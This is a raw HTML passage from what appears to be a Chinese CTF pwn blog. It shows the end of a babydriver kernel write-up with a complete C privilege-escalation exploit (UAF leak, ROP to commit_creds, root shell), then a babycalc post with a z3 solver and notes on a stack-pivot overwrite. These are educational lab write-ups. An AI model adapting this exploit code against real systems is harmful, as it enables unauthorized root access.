class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff810a1420</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff81e48c60</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveReg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;saved&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getRootShell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="keyword">if</span>(getuid())&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wrong&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span>         seq_fd;</span><br><span class="line"><span class="keyword">size_t</span>      pop_rdi_ret;</span><br><span class="line"><span class="keyword">size_t</span>      init_cred;</span><br><span class="line"><span class="keyword">size_t</span>      swapgs;</span><br><span class="line"><span class="keyword">size_t</span>      add_rsp_offset_ret;</span><br><span class="line"><span class="keyword">size_t</span>      magic_addr;</span><br><span class="line"><span class="keyword">size_t</span>      mov_cr4_ret;</span><br><span class="line"><span class="keyword">size_t</span>      swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>         fd[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">size_t</span>      leak_data[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line">    saveReg();</span><br><span class="line"></span><br><span class="line">    fd[<span class="number">0</span>] = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    fd[<span class="number">1</span>] = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    ioctl(fd[<span class="number">0</span>], <span class="number">0x10001</span>, <span class="number">0x20</span>);</span><br><span class="line">    close(fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    read(fd[<span class="number">1</span>], leak_data, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;data dump %d: %p\n&quot;</span>, i, leak_data[i]);</span><br><span class="line"></span><br><span class="line">    kernel_offset = leak_data[<span class="number">0</span>] - <span class="number">0xffffffff8122f4d0</span>;</span><br><span class="line">    kernel_base = (<span class="keyword">void</span>*) ((<span class="keyword">size_t</span>)kernel_base + kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Kernel offset: %llx\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Kernel base: %p\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    commit_creds = COMMIT_CREDS + kernel_offset;</span><br><span class="line">    init_cred = INIT_CRED + kernel_offset;</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret = <span class="number">0xffffffff810d238d</span> + kernel_offset; <span class="comment">/* pop rdi; ret; */</span></span><br><span class="line">    swapgs = <span class="number">0xffffffff81063694</span> + kernel_offset; <span class="comment">/* swapgs; pop rbp; ret; */</span></span><br><span class="line">    mov_cr4_ret = <span class="number">0xffffffff81004d80</span> + kernel_offset; <span class="comment">/* mov cr4, rdi; pop rbp; ret; */</span></span><br><span class="line"></span><br><span class="line">    magic_addr = kernel_offset + <span class="number">0xffffffff810d238d</span>; <span class="comment">/* 为了打断点而随便找的 */</span></span><br><span class="line">    add_rsp_offset_ret = kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode = kernel_offset;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;magic_addr: 0x%llx\n&quot;</span>, magic_addr);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    write(fd[<span class="number">1</span>], &amp;magic_addr, <span class="number">8</span>);</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0x55555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, add_rsp_offset_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, commit_creds;&quot;</span> </span><br><span class="line">        <span class="string">&quot;mov r12, init_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp, 0xbbbb1111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx, pop_rdi_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,  0x99999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,  0x88888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0x666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    getRootShell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>主要是参考 <a target="_blank" rel="noopener" href="https://www.anquanke.com/member.html?memberId=157910">墨晚鸢</a> 大佬的博客：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/266897#h3-2">在 2021 年再看 ciscn_2017 - babydriver（下）：KPTI bypass、ldt_struct 的利用、pt_regs 通用内核ROP解法-安全客 - 安全资讯平台 (anquanke.com)</a> </li>
</ul>
<p>他给出的参考题目应该是改过内核版本的，我手上没有对应版本的题目，最后只能将就了</p>
<p>之后抽时间学一下 <code>ldt_struct</code> 的利用</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/05/%E6%A0%88%E8%BF%81%E7%A7%BB+%E7%88%86%E7%A0%B4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/05/%E6%A0%88%E8%BF%81%E7%A7%BB+%E7%88%86%E7%A0%B4/" class="post-title-link" itemprop="url">栈迁移+爆破</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-05 16:56:43 / Modified: 16:58:57" itemprop="dateCreated datePublished" datetime="2023-02-05T16:56:43+08:00">2023-02-05</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.1k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>babycalc</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">babycalc: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">05</span>ede67cc5aa402b2f1ee02f5e62dd05e80a1f8a, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Partial RELRO，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int8 v0; <span class="comment">// al</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">208</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"><span class="keyword">unsigned</span> __int8 v[<span class="number">16</span>]; <span class="comment">// [rsp+D0h] [rbp-30h]</span></span><br><span class="line"><span class="keyword">int</span> i; <span class="comment">// [rsp+FCh] [rbp-4h]</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;number-%d:&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">buf[(<span class="keyword">int</span>)read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL)] = <span class="number">0</span>;       <span class="comment">// 栈溢出</span></span><br><span class="line">v0 = strtol(buf, <span class="number">0LL</span>, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">v[i] = v0;</span><br></pre></td></tr></table></figure>
<ul>
<li>有栈溢出，可以修改<code>i</code></li>
<li>配合后面的赋值可以修改一字节</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>首先需要绕过一个 check：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v[<span class="number">2</span>] * v[<span class="number">1</span>] * v[<span class="number">0</span>] - v[<span class="number">3</span>] != <span class="number">0x8D56</span></span><br><span class="line">  || v[<span class="number">0</span>] != <span class="number">0x13</span></span><br><span class="line">  || v[<span class="number">2</span>] * <span class="number">0x13</span> * v[<span class="number">1</span>] + v[<span class="number">3</span>] != <span class="number">0x8DE2</span></span><br><span class="line">  || (v[<span class="number">10</span>] + v[<span class="number">0</span>] - v[<span class="number">5</span>]) * v[<span class="number">13</span>] != <span class="number">0x8043</span></span><br><span class="line">  || (v[<span class="number">1</span>] * v[<span class="number">0</span>] - v[<span class="number">2</span>]) * v[<span class="number">3</span>] != <span class="number">0xAC8A</span></span><br><span class="line">  || (v[<span class="number">2</span>] + v[<span class="number">1</span>] * v[<span class="number">0</span>]) * v[<span class="number">3</span>] != <span class="number">0xC986</span></span><br><span class="line">  || v[<span class="number">6</span>] * v[<span class="number">5</span>] * v[<span class="number">4</span>] - v[<span class="number">7</span>] != <span class="number">0xF06D</span></span><br><span class="line">  || v[<span class="number">7</span>] * v[<span class="number">12</span>] + v[<span class="number">1</span>] + v[<span class="number">15</span>] != <span class="number">0x4A5D</span></span><br><span class="line">  || v[<span class="number">6</span>] * v[<span class="number">5</span>] * v[<span class="number">4</span>] + v[<span class="number">7</span>] != <span class="number">0xF1AF</span></span><br><span class="line">  || (v[<span class="number">5</span>] * v[<span class="number">4</span>] - v[<span class="number">6</span>]) * v[<span class="number">7</span>] != <span class="number">0x8E03D</span></span><br><span class="line">  || v[<span class="number">8</span>] != <span class="number">50</span></span><br><span class="line">  || (v[<span class="number">6</span>] + v[<span class="number">5</span>] * v[<span class="number">4</span>]) * v[<span class="number">7</span>] != <span class="number">0x8F59F</span></span><br><span class="line">  || v[<span class="number">10</span>] * v[<span class="number">9</span>] * v[<span class="number">8</span>] - v[<span class="number">11</span>] != <span class="number">0x152FD3</span></span><br><span class="line">  || v[<span class="number">10</span>] * v[<span class="number">9</span>] * v[<span class="number">8</span>] + v[<span class="number">11</span>] != <span class="number">0x15309D</span></span><br><span class="line">  || (v[<span class="number">9</span>] * v[<span class="number">8</span>] - v[<span class="number">10</span>]) * v[<span class="number">11</span>] != <span class="number">0x9C48A</span></span><br><span class="line">  || (v[<span class="number">8</span>] * v[<span class="number">2</span>] - v[<span class="number">13</span>]) * v[<span class="number">9</span>] != <span class="number">0x4E639</span></span><br><span class="line">  || (v[<span class="number">10</span>] + v[<span class="number">9</span>] * v[<span class="number">8</span>]) * v[<span class="number">11</span>] != <span class="number">0xA6BD2</span></span><br><span class="line">  || v[<span class="number">14</span>] * v[<span class="number">13</span>] * v[<span class="number">12</span>] - v[<span class="number">15</span>] != <span class="number">0x8996D</span></span><br><span class="line">  || v[<span class="number">14</span>] * v[<span class="number">13</span>] * v[<span class="number">12</span>] + v[<span class="number">15</span>] != <span class="number">0x89973</span></span><br><span class="line">  || v[<span class="number">11</span>] != <span class="number">101</span></span><br><span class="line">  || (v[<span class="number">13</span>] * v[<span class="number">12</span>] - v[<span class="number">14</span>]) * v[<span class="number">15</span>] != <span class="number">0x112E6</span></span><br><span class="line">  || (v[<span class="number">14</span>] + v[<span class="number">13</span>] * v[<span class="number">12</span>]) * v[<span class="number">15</span>] != <span class="number">0x11376</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接用 z3 求解：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">v1,v2,v3,v4 = Ints(<span class="string">&#x27;v1 v2 v3 v4&#x27;</span>)</span><br><span class="line">v5,v6,v7,v8 = Ints(<span class="string">&#x27;v5 v6 v7 v8&#x27;</span>)</span><br><span class="line">v9,v10,v11,v12 = Ints(<span class="string">&#x27;v9 v10 v11 v12&#x27;</span>)</span><br><span class="line">v13,v14,v15,v16 = Ints(<span class="string">&#x27;v13 v14 v15 v16&#x27;</span>)</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line">solver.add(v1*v2*v3-v4==<span class="number">0x8D56</span>)</span><br><span class="line">solver.add(v1==<span class="number">0x13</span>)</span><br><span class="line">solver.add(v3*<span class="number">0x13</span>*v2+v4==<span class="number">0x8DE2</span>)</span><br><span class="line">solver.add((v11+v1-v6)*v14==<span class="number">0x8043</span>)</span><br><span class="line">solver.add((v2*v1-v3)*v4==<span class="number">0xAC8A</span>)</span><br><span class="line">solver.add((v3+v2*v1)*v4==<span class="number">0xC986</span>)</span><br><span class="line">solver.add(v7*v6*v5-v8==<span class="number">0xF06D</span>)</span><br><span class="line">solver.add(v8*v13+v2+v16==<span class="number">0x4A5D</span>)</span><br><span class="line">solver.add(v7*v6*v5+v8==<span class="number">0xF1AF</span>)</span><br><span class="line">solver.add((v6*v5-v7)*v8==<span class="number">0x8E03D</span>)</span><br><span class="line">solver.add(v9==<span class="number">50</span>)</span><br><span class="line">solver.add((v7+v6*v5)*v8==<span class="number">0x8F59F</span>)</span><br><span class="line">solver.add(v11*v10*v9-v12==<span class="number">0x152FD3</span>)</span><br><span class="line">solver.add(v11*v10*v9+v12==<span class="number">0x15309D</span>)</span><br><span class="line">solver.add((v10*v9-v11)*v12==<span class="number">0x9C48A</span>)   </span><br><span class="line">solver.add((v9*v3-v14)*v10==<span class="number">0x4E639</span>)</span><br><span class="line">solver.add((v11+v10*v9)*v12==<span class="number">0xA6BD2</span>)    </span><br><span class="line">solver.add(v15*v14*v13-v16==<span class="number">0x8996D</span>)</span><br><span class="line">solver.add(v15*v14*v13+v16==<span class="number">0x89973</span>)</span><br><span class="line">solver.add(v12==<span class="number">101</span>)</span><br><span class="line">solver.add((v14*v13-v15)*v16==<span class="number">0x112E6</span>)</span><br><span class="line">solver.add((v15+v14*v13)*v16==<span class="number">0x11376</span>)        </span><br><span class="line">           </span><br><span class="line"><span class="keyword">if</span> solver.check() == sat: </span><br><span class="line">    ans = solver.model() </span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no ans!&quot;</span>)  </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[v1 = <span class="number">19</span>,</span><br><span class="line"> v9 = <span class="number">50</span>,</span><br><span class="line"> v12 = <span class="number">101</span>,</span><br><span class="line"> v10 = <span class="number">131</span>,</span><br><span class="line"> v4 = <span class="number">70</span>,</span><br><span class="line"> v3 = <span class="number">53</span>,</span><br><span class="line"> v13 = <span class="number">118</span>,</span><br><span class="line"> v2 = <span class="number">36</span>,</span><br><span class="line"> v16 = <span class="number">3</span>,</span><br><span class="line"> v15 = <span class="number">24</span>,</span><br><span class="line"> v7 = <span class="number">17</span>,</span><br><span class="line"> v8 = <span class="number">161</span>,</span><br><span class="line"> v6 = <span class="number">66</span>,</span><br><span class="line"> v5 = <span class="number">55</span>,</span><br><span class="line"> v11 = <span class="number">212</span>,</span><br><span class="line"> v14 = <span class="number">199</span>]</span><br></pre></td></tr></table></figure>
<p>入侵思路就是通过一字节修改来伪造返回地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bt</span><br><span class="line">#<span class="number">0</span>  <span class="number">0x00000000004007f0</span> in ?? ()</span><br><span class="line">#<span class="number">1</span>  <span class="number">0x0000000000400c3c</span> in ?? ()</span><br><span class="line">Backtrace stopped: <span class="function">previous frame inner to <span class="keyword">this</span> <span class="title">frame</span> <span class="params">(corrupt <span class="built_in">stack</span>?)</span></span></span><br><span class="line"><span class="function">pwndbg&gt; telescope 0x0000000000400c3c</span></span><br><span class="line"><span class="function">00:0000│  0x400c3c ◂— nop    </span></span><br><span class="line"><span class="function">01:0008│  0x400c44 ◂— mov    r15d, edi</span></span><br><span class="line"><span class="function">02:0010│  0x400c4c ◂— lea    esp, [rip + 0x2011be]</span></span><br><span class="line"><span class="function">03:0018│  0x400c54 ◂— lea    ebp, [rip + 0x2011be]</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bt</span><br><span class="line">#<span class="number">0</span>  <span class="number">0x0000000000400ba6</span> in ?? ()</span><br><span class="line">#<span class="number">1</span>  <span class="number">0x0000000000400c18</span> in ?? ()</span><br><span class="line">Backtrace stopped: <span class="function">previous frame inner to <span class="keyword">this</span> <span class="title">frame</span> <span class="params">(corrupt <span class="built_in">stack</span>?)</span></span></span><br><span class="line"><span class="function">pwndbg&gt; telescope 0x0000000000400c18</span></span><br><span class="line"><span class="function">00:0000│  0x400c18 ◂— leave  </span></span><br><span class="line"><span class="function">01:0008│  0x400c20 ◂— add    byte ptr [rax], al</span></span><br><span class="line"><span class="function">02:0010│  0x400c28 ◂— mov    eax, 0</span></span><br><span class="line"><span class="function">03:0018│  0x400c30 ◂— 0xe800000000b8ffff</span></span><br></pre></td></tr></table></figure>
<ul>
<li>通过覆盖返回地址低位就可以构造出两个 <code>leave ret</code>，然后打栈迁移</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x400bb7</span>    leave  </span><br><span class="line">  <span class="number">0x400bb8</span>    ret    </span><br><span class="line">   ↓</span><br><span class="line">  <span class="number">0x400c18</span>    leave  </span><br><span class="line">  <span class="number">0x400c19</span>    ret  </span><br></pre></td></tr></table></figure>
<p>这里的栈迁移比较靠运气，核心点就是利用程序的置空操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf[(<span class="keyword">int</span>)read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL)] = <span class="number">0</span>; </span><br></pre></td></tr></table></figure>
<p>利用这一点可以把栈上存储的 RBP 末尾给置空，从而可以把 RSP 迁移到某个末尾为 <code>\x00</code> 的栈地址上，如果这里刚好是 ROP 链就可以劫持程序流（但栈的随机化程度大，恰好命中的可能比较小）</p>
<p>下面展示一个成功的案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RBP  <span class="number">0x7ffd50a0aab0</span> —▸ <span class="number">0x7ffd50a0aa00</span> ◂— <span class="number">0x1</span></span><br><span class="line">RSP  <span class="number">0x7ffd50a0a9b0</span> ◂— <span class="number">0x6161616161613432</span> (<span class="string">&#x27;24aaaaaa&#x27;</span>)</span><br></pre></td></tr></table></figure>
